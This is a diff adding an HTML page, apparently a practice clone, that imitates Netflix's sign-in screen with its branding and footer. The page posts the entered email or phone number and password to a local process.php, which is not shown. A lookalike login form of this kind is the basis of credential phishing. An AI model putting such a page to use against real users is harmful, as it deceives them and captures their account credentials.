@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+        <head>
+         <meta charset="UTF-8">
+         <meta http-equiv="X-UA-Compatible" content="IE=edge">
+         <meta name="viewport" content="width=device-width, initial-scale=1.0">
+         <link rel="stylesheet" href="src/signup.css" />
+            <meta name="description" content="Welcom to Netflix singup-page." />
+            <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"
+              integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
+            <link rel="preconnect" href="https://fonts.googleapis.com" />
+            <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+            <link
+              href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+              rel="stylesheet" />
+            <link rel="icon" href="http://pngimg.com/uploads/netflix/small/netflix_PNG15.png">
+            <title>Sign-up page</title>
+    </head>
+
+    <body>
+    <header class="header">
+        <nav>
+            <h1><a href=""> NETFLIX </a></h1> 
+            <h2>Sign In</h2>
+        </nav>
+    </header>
+    
+ <form class="form" method="post" action="src/process.php">
+ <center>
+     <input type="text" name="username" placeholder="Email or phone number" required> <br /> <br />
+<input type="password" name="password" placeholder="Password" required>
+<br> <br> <br>
+
+<button class="btn">Sign In</button>
+</center>
+ <br> <br>
+ 
+<input type="checkbox">Remember me</input> 
+<br> <br><a href="WWW.facebook.com">
+    <img alt="images-(2)" src="data:image/png;base64,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" width="20px" height="20px">
+Login with Facebook</a>
+
+<h3>New to Netflix? <a href="">Sign Up now</a></h3>
+ </form>   
+
+<p> This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more.</a></p> <br> <br> <br> <hr>
+   
+<footer>
+       <a href="#">Questions? contact us Call 000-800-919-1694</a>
+       <div class="footer-content-fab">
+       <ul class="list-item">
+     <li><a href="#">FAQ | </a> <br>
+     <li><a href="#">Terms of use</a>| <br>
+     <li><a href="#">Cookie references</a>|<br>
+     <li><a href="#">Help Center</a>| <br>
+     <li><a href="#">Privacy</a>| <br>
+     <li><a href="#">Corporate Information</a>
+           </ul>
+       </div>
+    </footer>
+        
+    </body>
+</html>
